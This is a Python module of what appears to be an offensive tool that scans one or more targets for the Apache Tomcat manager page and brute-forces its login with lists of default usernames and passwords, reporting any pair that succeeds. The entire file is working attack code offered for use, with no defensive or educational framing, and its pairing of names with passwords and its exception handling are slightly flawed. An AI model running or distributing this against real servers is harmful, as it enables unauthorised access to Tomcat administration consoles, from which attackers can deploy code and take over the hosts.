from requests import get
from base64 import b64encode
from time import sleep

from rich.console import Console
console = Console()

from urllib3 import disable_warnings
disable_warnings()

from src.core.manager import props, get_usernames, get_passwords

def check_and_connect(target):
    url: str = f"{target}/manager/html"

    try:
        response = get(url, **props)
        body: str = response.text
        status_code: str = response.status_code

        if (status_code == 401 or status_code == 403 or status_code == 200):
            if ('Tomcat' in body or 'tomcat' in body):
                bruteforce(url)
        else:
            console.print(f"[red][-] Connection problems with {target} | {status_code} [/]")

    except Exception as e:
        raise e

    except ConnectionRefusedError:
        pass

def connect(args) -> str:
    """ Check if target is alive and try to connect with Apache Tomcat login page """

    target = args.u
    target_list = args.l

    if target:
        check_and_connect(target)
    elif target_list:
        with open(target_list, "r+") as file:
            content = file.readlines()

            for target in content:
                if target:
                    check_and_connect(target.rstrip())


def bruteforce(url) -> str:
    """ Bruteforce Apache Tomcat login with default credentials """

    console.print(f"[green][+][/] Starting bruteforce on [bold white]{url}", highlight=False)
    console.print(f"[green][+][/] {len(get_usernames())} usernames loaded. {len(get_passwords())} passwords loaded\n", highlight=False)

    for user, password in zip(get_usernames(), get_passwords()):

        response = get(url, verify=False, auth=(user, password))
        sleep(1)
        status_code: str = response.status_code

        console.print(f'[yellow][!][/] User: {user} - Password: {password} - {status_code}', highlight=False)

        if (status_code == 200):
            console.print(f"\n[green][+][/] Credentials found: {user} - {password} - {status_code}", highlight=False)
            console.print(f"[green][+][/] Bruteforce in {url} is done", highlight=False)
            return

    console.print(f"\n[green][+][/] Bruteforce in {url} is done", highlight=False)